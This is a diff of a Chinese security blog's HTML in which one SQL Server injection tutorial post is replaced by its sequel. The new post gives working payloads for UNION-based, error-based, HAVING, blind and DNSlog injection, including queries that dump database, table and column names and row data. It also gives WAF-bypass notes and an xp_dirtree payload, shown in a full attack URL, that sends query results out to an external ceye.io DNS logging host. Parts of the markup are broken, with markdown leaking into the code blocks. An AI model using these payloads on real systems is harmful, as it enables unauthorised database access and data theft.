@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>SQL SERVER 注入（一） | WLSMILE Blog</title>
+  <title>SQL SERVER 注入（二） | WLSMILE Blog</title>
   <meta name="keywords" content=" 注入 , sql server ">
-  <meta name="description" content="SQL SERVER 注入（一） | WLSMILE Blog">
+  <meta name="description" content="SQL SERVER 注入（二） | WLSMILE Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="UNION SELECT 联合查询注入SQL server 中的联合查询注入和 MySQL 中的联合查询注入非常相似，但是也有不同的地方。相同点是都必须要有回显位，并且要与列数相同。不同的是MySQL占位符一般用1，2，3，4数字，而 SQL server 中要用到 null 作为占位符。因为如果用数字的话会牵扯到隐式转化的问题而导致无法有正常的回显。 首先利用 order by 语句查询出有几列">
 <meta name="keywords" content="注入,sql server">
@@ -343,9 +343,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-6" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-7" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">SQL SERVER 注入（一）</h1>
+        <h1 class="article-title">SQL SERVER 注入（二）</h1>
     
     <div class="article-meta">
         
@@ -369,7 +369,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-10-11 10:40:56'>2019-10-11 10:28</time>
+        创建时间:<time class="date" title='更新时间: 2019-10-11 21:15:29'>2019-10-11 21:09</time>
         
     </div>
     <div class="article-meta">
@@ -391,7 +391,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-server-的基础知识部分"><span class="toc-text">SQL server 的基础知识部分</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#系统库的简介"><span class="toc-text">系统库的简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三个视图的简单使用（sysdatabases-sysobjects-syscolumns）"><span class="toc-text">三个视图的简单使用（sysdatabases,sysobjects,syscolumns）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#查询所有的数据库名"><span class="toc-text">查询所有的数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查询数据库中所有的表名"><span class="toc-text">查询数据库中所有的表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查询表中所有的列名"><span class="toc-text">查询表中所有的列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查询字段"><span class="toc-text">查询字段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注释符以及各种信息探测"><span class="toc-text">注释符以及各种信息探测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#注释风格"><span class="toc-text">注释风格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#空白格字符（多用来绕过-WAF）"><span class="toc-text">空白格字符（多用来绕过 WAF）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常用运算符号"><span class="toc-text">常用运算符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基础信息探测"><span class="toc-text">基础信息探测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用-top-进行限制查询"><span class="toc-text">利用 top 进行限制查询</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UNION-SELECT-联合查询注入"><span class="toc-text">UNION SELECT 联合查询注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-server-的报错注入"><span class="toc-text">SQL server 的报错注入</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -407,119 +407,92 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="SQL-server-的基础知识部分"><a href="#SQL-server-的基础知识部分" class="headerlink" title="SQL server 的基础知识部分"></a>SQL server 的基础知识部分</h1><h2 id="系统库的简介"><a href="#系统库的简介" class="headerlink" title="系统库的简介"></a>系统库的简介</h2><p>Sqlserver数据库有四个系统数据库，分别是master，model，msdb，tempdb。我<br>们最经常使用到的时master 库，它与 MySQL 中的information_schema 库有几分相似，<br>都存储了所有数据库库名（sysdatabases），表名（sysobjects），字段名（syscolumns）。<br>而我们在注入的过程当中就要用的 master 库中的这三个视图，无论是联合查询注入还是盲<br>注与 DNSlog 注入都离不开这三个视图表。</p>
-<p>系统库简述：</p>
-<table>
-<thead>
-<tr>
-<th>库名</th>
-<th>简述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>master</td>
-<td>用于记录所有 SQL Server 系统级别的信息，这些信息用于控制用户数据库和数据操作。</td>
-</tr>
-<tr>
-<td>model</td>
-<td>SQLServer 为用户数据库提供的样板，新的用户数据库都以 model 数据库为基础</td>
-</tr>
-<tr>
-<td>msdb</td>
-<td>由 Enterprise Manager 和Agent 使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。</td>
-</tr>
-<tr>
-<td>tempdb</td>
-<td>它为临时表和其他临时工作提供了一个存储区。</td>
-</tr>
-</tbody></table>
-<h2 id="三个视图的简单使用（sysdatabases-sysobjects-syscolumns）"><a href="#三个视图的简单使用（sysdatabases-sysobjects-syscolumns）" class="headerlink" title="三个视图的简单使用（sysdatabases,sysobjects,syscolumns）"></a>三个视图的简单使用（sysdatabases,sysobjects,syscolumns）</h2><h3 id="查询所有的数据库名"><a href="#查询所有的数据库名" class="headerlink" title="查询所有的数据库名"></a>查询所有的数据库名</h3><p><code>select *from master..sysyatabases</code></p>
-<p><img src="/images/6/1.png" alt></p>
-<p>这条语句会显示出数据库的所有信息，其中我们应用到的有name 和 dbid这俩个字段。而我们通常只需要知道名称即可，所以用到了如下语句：</p>
-<p><code>select name from master..sysdatabases</code></p>
-<p><img src="/images/6/2.png" alt></p>
-<h3 id="查询数据库中所有的表名"><a href="#查询数据库中所有的表名" class="headerlink" title="查询数据库中所有的表名"></a>查询数据库中所有的表名</h3><p><code>select name from master..sysobjects where Xtypee = &#39;x&#39;</code></p>
-<p><img src="/images/6/3.png" alt></p>
-<h3 id="查询表中所有的列名"><a href="#查询表中所有的列名" class="headerlink" title="查询表中所有的列名"></a>查询表中所有的列名</h3><p><code>select * from databases..table</code></p>
-<p>例如：select * from test..test</p>
-<p><img src="/images/6/4.png" alt></p>
-<h3 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h3><p><code>select * from test..syscolumns where xtype=167</code></p>
-<p><img src="/images/6/5.png" alt></p>
-<p>Tip:在对 sysobjects 和 syscolumns 使用的时候我们需要增加一个 xtype 作为限制条件，<br>而在两个视图当中也都有着不同的含义。具体参照：</p>
-<p><a href="https://www.cnblogs.com/zhaomengmeng/p/4933828.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaomengmeng/p/4933828.html</a></p>
-<h2 id="注释符以及各种信息探测"><a href="#注释符以及各种信息探测" class="headerlink" title="注释符以及各种信息探测"></a>注释符以及各种信息探测</h2><h3 id="注释风格"><a href="#注释风格" class="headerlink" title="注释风格"></a>注释风格</h3><pre><code>/*
--- 常用
-;%00
-</code></pre><h3 id="空白格字符（多用来绕过-WAF）"><a href="#空白格字符（多用来绕过-WAF）" class="headerlink" title="空白格字符（多用来绕过 WAF）"></a>空白格字符（多用来绕过 WAF）</h3><pre><code>01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,1415,16,17,18,19,1A,1B,1
-C,1D,1E,1F,20
-/**/
-</code></pre><h3 id="常用运算符号"><a href="#常用运算符号" class="headerlink" title="常用运算符号"></a>常用运算符号</h3><table>
-<thead>
-<tr>
-<th align="center">+</th>
-<th align="left">加法运算</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">-</td>
-<td align="left">减法运算</td>
-</tr>
-<tr>
-<td align="center">*</td>
-<td align="left">乘法运算</td>
-</tr>
-<tr>
-<td align="center">/</td>
-<td align="left">除法运算</td>
-</tr>
-<tr>
-<td align="center">&amp;</td>
-<td align="left">位与逻辑运算，从两个表达式中取对应的位。当且仅当输入表达式中两个位的值都为 1 时，结果中的位才被设置为 1，否则，结果中的位被设置为 0</td>
-</tr>
-<tr>
-<td align="center">|</td>
-<td align="left">位或逻辑运算，从两个表达式中取对应的位。如果输入表达式中两个位只要有一个的值 1 时，结果的位就被设置为 1，只有当两个位的值都为 0 时，结果中的位才被设置为 0</td>
-</tr>
-<tr>
-<td align="center">^</td>
-<td align="left">位异或运算，从两个表达式中取对应的位。如果输入表达式中两个位只有一个的值为 1 时，结果中的位就被设置为 1；只有当两个位的值都为 0 或 1 时，结果中的位才被设置为 0</td>
-</tr>
-</tbody></table>
-<h3 id="基础信息探测"><a href="#基础信息探测" class="headerlink" title="基础信息探测"></a>基础信息探测</h3><pre><code>@@VERSION,@@SERVERNAME,@@SERVICENAME; 
---Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) 
---WIN-2008
---MSSQLSERVER
+        <h1 id="UNION-SELECT-联合查询注入"><a href="#UNION-SELECT-联合查询注入" class="headerlink" title="UNION SELECT 联合查询注入"></a>UNION SELECT 联合查询注入</h1><p>SQL server 中的联合查询注入和 MySQL 中的联合查询注入非常相似，但是也有不同的地方。相同点是都必须要有回显位，并且要与列数相同。不同的是MySQL占位符一般用1，2，3，4数字，而 SQL server 中要用到 null 作为占位符。因为如果用数字的话会牵扯到隐式转化的问题而导致无法有正常的回显。</p>
+<p>首先利用 order by 语句查询出有几列</p>
+<p><img src="/images/1.png" alt></p>
+<p>查询出有 4列后进行联合查询注入 ，首先查出所有数据库名。</p>
+<p><img src="/images/2.png" alt></p>
+<p>之后爆出 test 库下的所有表</p>
+<p><img src="/images/3.png" alt></p>
+<p>爆出 message 表下的所有字段</p>
+<p><img src="/images/4.png" alt></p>
+<p>之后可以任意的查询字段值了</p>
+<h1 id="SQL-server-的报错注入"><a href="#SQL-server-的报错注入" class="headerlink" title="SQL server 的报错注入"></a>SQL server 的报错注入</h1><p>报错注入相对简单很多，但前提是网站管理员打开了报错界面的详细信息，而对于粗心的管<br>理员的话就非常有可能忘记关闭了。在报错注入中我们最重要的是收集一些bypass，如果<br>碰到 WAF也可以尝试绕过，下面是我收集的一些</p>
+<ul>
+<li>判断数据库类型 </li>
+</ul>
+<pre><code>and exists (select * from sysobjects)--返回正常为mssql
+and exists (select count(*) from sysobjects)--有时上面那个语句不行就用这个</code></pre><p><img src="/images/5.png" alt></p>
+<ul>
+<li>判断数据库版本</li>
+</ul>
+<pre><code>and 1=@@version--这个语句要在有回显的模式下才可以哦
+and substring((select @@version),22,4)=&#39;2008&#39;--适用于无回显模式</code></pre><p><img src="/images/6.png" alt></p>
+<ul>
+<li><p>获取所有数据库的个数</p>
+<pre><code>and 1=(select quotename(count(name)) from master..sysdatabases)--
+and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases) --
+and 1=(select str(count(name))%2b&#39;|&#39; from master..sysdatabases where dbid&gt;0) --
+and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases where dbid&gt;0) -</code></pre><p><img src="/images/7.png" alt></p>
+</li>
+<li><p>获取数据库名称</p>
+<pre><code>（该语句是一次性获取全部数据库的，且语句只适合&gt;=2005，两条语句可供选择使用）
+and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(&#39;&#39;))-
+and 1=(select &#39;|&#39;%2bname%2b&#39;|&#39; from master..sysdatabases FOR XML PATH(&#39;&#39;))-</code></pre><p><img src="/images/8.png" alt></p>
+</li>
+</ul>
+<p>-获取当前数据库</p>
+<pre><code>and db_name()&gt;0
+and 1=(select db_name())-</code></pre><p><img src="/images/9.png" alt></p>
+<ul>
+<li>获取当前数据库中的表名<pre><code>(有2 个语句可供选择使用)下列语句可一次爆数据库所有表（只限于mssql2005 及以上版本）
+and 1=(select quotename(name) from 数据库名..sysobjects where xtype=&#39;U&#39; FOR XML PATH(&#39;&#39;))-
+and 1=(select &#39;|&#39;%2bname%2b&#39;|&#39; from 数据库名..sysobjects where xtype=&#39;U&#39; FOR XML PATH(&#39;&#39;))-
+</code></pre></li>
+</ul>
+<pre><code>![](/images/10.png)
 
-USER,CURRENT_USER,SESSION_USER,SYSTEM_USER; 
---dbo
---dbo
---dbo
---sa
+- 获得表里的列</code></pre><p>一次爆指定表的所有列（只限于 mssql2005 及以上版本）：<br>and 1=(select quotename(name) from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name=’指定表名’) FOR XML PATH(‘’))-<br>and 1=(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name=’指定表名’) FOR XML PATH(‘’))-</p>
+<pre><code>![](/images/11.png)
 
-USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME(); 
---dbo
---wyb
---46530
---sa
+- 获取指定数据库中的表的所有值</code></pre><p>逐条爆指定表的所有字段的数据（只限于 mssql2005 及以上版本）：<br>and 1=(select top 1 * from 指定数据库..指定表名 where 排除条件 FOR XML PATH(‘’))–</p>
+<p>一次性爆 N条所有字段的数据（只限于 mssql2005 及以上版本）：<br>and 1=(select top N * from 指定数据库..指定表名 FOR XML PATH(‘’))–复制代码<br>and 1=(select top 1 * from 指定数据库..指定表名 FOR XML PATH(‘’))</p>
+<pre><code>![](/images/12.png)
 
-USER_ID(),USER_SID(); 
---1
---&lt;01&gt;
-ORIGINAL_LOGIN(); 
---sa
-</code></pre><h2 id="利用-top-进行限制查询"><a href="#利用-top-进行限制查询" class="headerlink" title="利用 top 进行限制查询"></a>利用 top 进行限制查询</h2><p>在 mysql 注入中我们会遇到一行不能够显示多列的情况，解决的方法是利用 limit m,n 进行<br>控制，将数据逐行输出。而在 SQL server 中也有这样的情况（尤其是利用 DNSlog 注入时），<br>我们就可以用如下两种方法做到与 limit m,n 同样的效果</p>
-<p>(1)在查询数据库名称时利用 dbid 进行限制查询</p>
-<p>由于 dbid 是系统数据库所特有的，所有可以依次从 1 到 n 注出所有的数据库名</p>
-<p><img src="/images/6/6.png" alt></p>
-<p>(2)在查询表和字段时利用 top 语法进行查询</p>
-<p>在 sysobjects 和 syscolumns 视图当拥有大量的数据，如果依据 id 值进行限制会非常的繁<br>琐，浪费时间。所以可以用到如下 sql 查询语法：</p>
-<p>取第 m 条到第 n 条记录</p>
-<pre><code>select top (n-m+1) id from tablename
-where id not in (
-    select top m-1 id from tablename
-)</code></pre><p>具体利用：</p>
-<p><img src="/images/6/7.png" alt></p>
-<p>这样我们在 DNSlog 注入时才能拼接完整的 payload。要学习新的sql注入，就要从基本的sql语句开始。</p>
+## having语法注入
+如果页面开启了报错页面的详细信息，我们也可以用having 语法直接爆出列名，利用手法是在每一次爆出列名后再加上爆出的列名一直进行。
+![](/images/13.png)
+
+爆出列名 id,我们利用 group by构造出如下语句爆出下一个列名
+![](/images/14.png)
+
+之后依次爆出所有的列名之后页面就会返回正常页面
+![](/images/15.png)
+
+
+# SQL server 盲注
+大多数的站很少会开启报错页面，盲注是比较常见的类型。基本的盲注分为布尔型盲注 和时间盲注，但这两种注入都非常浪费时间，解决盲注时间问题的方法无非是写脚本或者利 用 DNSlog，而 DNSlog 注入的方式会大大减少注入的时间，所以也是首选的方法。在 sqlserver 中布尔盲注也没有太多的手法，依然是分割字符串并用 ascii 函数和二分法进行比较依次得 出整个字符串。而用到的语句也是在 0x00 中写到的最基本的三个视图的基本利用。 
+
+## 普通盲注
+Payload：</code></pre><p>and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) &gt;= 109</p>
+<pre><code>
+其中的 select top 1 name from master.dbo.sysdatabases 就是我们要查询的内容并且
+进行分割，方法很直白.
+
+## DNSlog注入
+DNSlog注入的基本原理是将查询出来的字符进行拼接之后进行访问 xxxxx.ceye.io 及其子域名，产生出 DNSlog日志，通过查看日志我们就可以看到我们所查询出来的内容。而在这时，我们学习的单行查询就很重要了，因为在拼接URL 的时候，只能拼接一个单词作为子域名进行访问，如果是多个的话就不会产生DNS 日志。这里有一个知道创宇的 DNS 平台：http://ceye.io
+
+`SQL server 的DNSlog注入语句:`</code></pre><p>;declare @a char(128);set @a=’\‘%2b(select top 1 name from master.dbo.sysdata<br>bases)%2b’.*****.ceye.io\abc’;exec master..xp_dirtree @a;</p>
+<pre><code>实际操作：
+
+![](/images/16.png)
+
+查出第一个数据库的库名为 master
+![](/images/17.png)
+
+然后我们利用 sysdatabases 的dbid字段查询处 dbid=5时的用户创建的数据库为test
+</code></pre><p><a href="http://192.168.10.19/char.asp?id=1%27;declare%20@a%20char(128);set%20@a=%27\\%27%2b(select%20name%20from%20master.dbo.sysdatabases%20where%20dbid=5)%2b%27.py88oq.ceye.io\abc%27;exec%20master..xp_dirtree%20@a;-" target="_blank" rel="noopener">http://192.168.10.19/char.asp?id=1%27;declare%20@a%20char(128);set%20@a=%27\\%27%2b(select%20name%20from%20master.dbo.sysdatabases%20where%20dbid=5)%2b%27.py88oq.ceye.io\abc%27;exec%20master..xp_dirtree%20@a;-</a><br>```<br><img src="/images/18.png" alt></p>
+<p>DNSlog注入还可以对 MySQL,oracle 数据库还有一些 CMS 都有利用，非常强大。具体的<br>注入细节问题访问：<br><a href="https://www.jianshu.com/p/ba52cf6e47db" target="_blank" rel="noopener">https://www.jianshu.com/p/ba52cf6e47db</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1102528985@qq.com </span>
@@ -529,12 +502,12 @@ where id not in (
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>SQL SERVER 注入（一）</p>
+    <p><span class="copy-title">文章标题:</span>SQL SERVER 注入（二）</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="WLSMILE">WLSMILE</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-10-11, 10:28:47</p>
-    <p><span class="copy-title">最后更新:</span>2019-10-11, 10:40:56</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/11/6/" title="SQL SERVER 注入（一）">https://luckdogiii.github.io/2019/10/11/6/</a>
+    <p><span class="copy-title">发布时间:</span>2019-10-11, 21:09:17</p>
+    <p><span class="copy-title">最后更新:</span>2019-10-11, 21:15:29</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/11/7/" title="SQL SERVER 注入（二）">https://luckdogiii.github.io/2019/10/11/7/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
